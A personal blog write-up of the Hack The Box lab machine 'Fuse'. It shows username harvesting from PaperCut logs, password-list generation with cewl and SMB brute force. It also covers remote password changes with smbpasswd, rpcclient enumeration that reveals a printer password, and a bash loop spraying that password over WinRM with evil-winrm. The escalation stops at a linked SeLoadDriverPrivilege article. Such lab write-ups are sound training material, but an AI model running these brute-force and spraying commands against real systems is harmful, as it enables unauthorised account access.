So this is the first Hackthebox machine that I was not able to fully complete. I knew what I had to do for the root part but it just wouldn't work and was not worth my time so I just understood the root exploit and moved to solving other machines. You may be wondering that if I didn't even complete the machine, why the writeup? Well, There was enough to learn in the user flag that it was worth writing about it. Besides who said that if I didn't solve the machine I am not allowed to write about it? It's my blog dammit! Lets do this.

Scanning the first 1000 ports we see quite a few open. Looks like a domain controller.

Lets just browse straight to the web page. Before that remember to add an entry like

`10.10.10.193  fuse.fabricorp.local`

`10.10.10.193  fuse.htb` 

inside the /etc/hosts file.

We see a bunch of log files. I looked up PaperCut for any exploits but didn't find anything good.

<img src="/images/fuse/website.png" width="1000" />

I looked inside the logs files and found a bunch of users and created a list of them.

{%highlight text%}
pmerton
tlavel
sthompson
bhult
administrator
{%endhighlight%}

Did a little more enumeration but didn't find anything. Thought that we if have a list of usernames lets try creating a list of passwords and try some good ol' brute force.

I use the tool cewl for this. Cewl is used to take a webpage as input and it spits out list of all possible passwords according to your customization.

{%highlight text%}
./cewl.rb --with-numbers -w fuse.txt http://fuse.fabricorp.local/papercut/logs/html/papercut-print-log-2020-05-29.htm
{%endhighlight%}

You will get a file named fuse.txt and it will contain several hundred passwords. Next I use hydra to try some brute force on the SMB port.

Ayyy! We have a 2 valid login creds. But when I try logging in with tlavel user and the found password I face an error unseen before.

{%highlight text%}
smbclient -L fuse.htb -U tlavel -c share
WARNING: The "syslog" option is deprecated
Enter WORKGROUP\tlavel's password: 
session setup failed: NT_STATUS_PASSWORD_MUST_CHANGE
{%endhighlight%}

After some googling I find that when this error appears it means that we will need to change the password for SMB before continuing. I find that we can use the tool smbpasswd to change passwords of SMB remotely.

{%highlight text%}
smbpasswd -r fuse.htb -U tlavel
Old SMB password:
New SMB password:
Retype new SMB password:
Password changed for user tlavel
{%endhighlight%}

After entering new credentials I try logging in SMB. This time we are successful.

{%highlight text%}
smbclient -L fuse.htb -U tlavel

{%endhighlight%}

I try reading some shares but soon found that the machine was resetting the password frequently. To overcome this I wrote a simple quick and dirty script.

{%highlight text%}
#!/bin/bash
printf 'Fabricorp01\nFabricorp09\nFabricorp09\n' | smbpasswd -r fuse.htb -U tlavel
{%endhighlight%}

I could have made it better by taking command line arguements but I just went ahead and used it. Just replace the password and run the script and the passwords will be updated. 

After a few tries I was able to read the shares like SYSVOL.

{%highlight text%}
smbclient \\\\fuse.htb\\SYSVOL -U tlavel

{%endhighlight%}

Sadly nothing interesting was residing inside the shares. Next I try connecting with RPCclient.

{%highlight text%}
rpcclient -U tlavel fuse.htb
mkdir failed on directory /var/run/samba/msg.lock: Permission denied
Enter WORKGROUP\tlavel's password: 
rpcclient $>
{%endhighlight%}

We do basic enum using commands like enumdomusers, enumprinters, enumdomains etc.
We get a new wordlists of users.

{%highlight text%}
rpcclient $> enumdomusers 
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[svc-print] rid:[0x450]
user:[bnielson] rid:[0x451]
user:[sthompson] rid:[0x641]

user:[dandrews] rid:[0x1bbe]
user:[mberbatov] rid:[0x1db1]
user:[astein] rid:[0x1db2]
user:[dmuir] rid:[0x1db3]
{%endhighlight%}

And a password too!

{%highlight text%}
rpcclient $> enumprinters
	flags:[0x800000]
	name:[\\10.10.10.193\HP-MFT01]
	description:[\\10.10.10.193\HP-MFT01,HP Universal Printing PCL 6,Central (Near IT, scan2docs password: $fab@s3Rv1ce$1)]
	comment:[]
{%endhighlight%}

Next I Search for other places where I could use credentials. Doing further nmap scans on higher ports I see 5985 which is the WinRm service. To exploit that we use evil-winrm.

We have the password but we still don't have the username so lets use the username list we got from rpcclient and brute force again. I create another simple bash script for this.

{%highlight text%}
#!/bin/bash
while read line; do echo $line;evil-winrm -i 10.10.10.193 -u $line -p '$fab@s3Rv1ce$1'; done < users
{%endhighlight%}

I let the script run and when I see a login shell I just press ctrl+c. We can login with the user svc-print. You can now find the user flag inside the Desktop of this user.

{%highlight text%}
evil-winrm -i 10.10.10.193 -u svc-print
Enter Password: 

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc-print\Documents> whoami
fabricorp\svc-print
{%endhighlight%}

Doing basic enumeration I find a test directory which was reset every two minutes. Next I found something interesting inside the current user privileges.

{%highlight text%}
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeLoadDriverPrivilege         Load and unload device drivers Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
{%endhighlight%}

If you think I know what any of this means **YOU** Sir! would be dead wrong! I don't know what any of this means. Trick is to just copy paste these terms in the google search bar and read up about any exploit they may have. I find an exploit for the SeLoadDriverPrivilege. 

[Link to the article](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)

I read up. I was able to understand parts of the exploit. I think this maybe a little bit too hard for me with my current knowledge of inner workings of windows. The hilarious part is that not only was I not able to understand the exploit I was not able to implement it either. So this machine was able to beat me this time. After this I think I will need some easy linux boxes to gain my lost confidence.
